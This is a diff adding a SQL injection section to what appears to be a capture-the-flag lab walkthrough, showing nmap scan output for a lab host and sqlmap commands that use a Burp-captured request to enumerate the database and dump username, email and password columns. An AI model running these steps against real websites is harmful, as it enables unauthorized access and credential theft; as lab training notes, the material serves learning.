@@ -1578,3 +1578,71 @@ Reverse Engineering
     │           0x00400b76      5d             pop rbp
     └           0x00400b77      c3             ret
     ```
+
+# Task 28
+SQL Injection
+
+* Enumerate - nmap
+    ```
+    nmap -A -T4 10.10.100.35 | tee nmap.txt
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 18:41 EST
+    Nmap scan report for 10.10.100.35
+    Host is up (0.22s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 f9:14:0a:5b:19:0c:4a:e9:3a:12:d9:2c:6c:7f:76:d5 (RSA)
+    |   256 cf:ee:bb:bd:3b:1c:90:0b:a7:bd:79:7c:4f:a2:3e:1e (ECDSA)
+    |_  256 d7:27:b9:e0:0f:c4:a8:ef:83:20:d1:ae:c2:cb:5a:57 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+    | http-cookie-flags: 
+    |   /: 
+    |     PHPSESSID: 
+    |_      httponly flag not set
+    |_http-server-header: Apache/2.4.29 (Ubuntu)
+    | http-title: Welcome to LapLANd!
+    |_Requested resource was register.php
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 25.41 seconds
+    ```
+* Enumerate - sqlmap
+    ```
+    sqlmap -u http://10.10.100.35 --forms --dump                                                                                                        
+            ___                                                                                                                                                                                             
+        __H__                                                                                                                                                                                            
+    ___ ___[)]_____ ___ ___  {1.5.2#stable}                                                                                                                                                                
+    |_ -| . [(]     | .'| . |                                                                                                                                                                               
+    |___|_  [']_|_|_|__,|  _|                                                                                                                                                                               
+        |_|V...       |_|   http://sqlmap.org                                                                                                                                                             
+                                                                                                                                                                                                            
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developer
+    s assume no liability and are not responsible for any misuse or damage caused by this program                                                                                                           
+                                                                                                                                                                                                            
+    [*] starting @ 18:42:21 /2021-03-01/                                                                                                                                                                    
+
+    [18:42:21] [INFO] testing connection to the target URL                                              
+    got a 302 redirect to 'http://10.10.100.35/register.php'. Do you want to follow? [Y/n] y                                                                                                                
+    you have not declared cookie(s), while server wants to set its own ('PHPSESSID=3vla8nsfabi...jl6930ob0j'). Do you want to use those [Y/n] y                                                             
+    [18:42:33] [INFO] searching for forms             
+    [18:42:34] [INFO] found a total of 2 targets                                                        
+    [#1] form:                                        
+    POST http://10.10.100.35/register.php                                  
+    ```
+* Sqlmap provides the injectable field
+* Load burp and navigate to the site, login as a dummy user to capture the request
+* In burp, right click the request and choose save item, save the file
+* Load sqlmap again and point to the file you saved in the last step to retrieve the db name
+    ```
+    sqlmap -r test.txt --current-db
+    ```
+* Load sqlmap again using the db name above to enumerate tables
+    ```
+    sqlmap -r test.txt -D [db_name] --tables
+    ```
+* With table names enumerated, list contents using
+    ```
+    sqlmap -r test.txt -D [db_name] -T [table_name] -C username,email,password --dump
+    ```
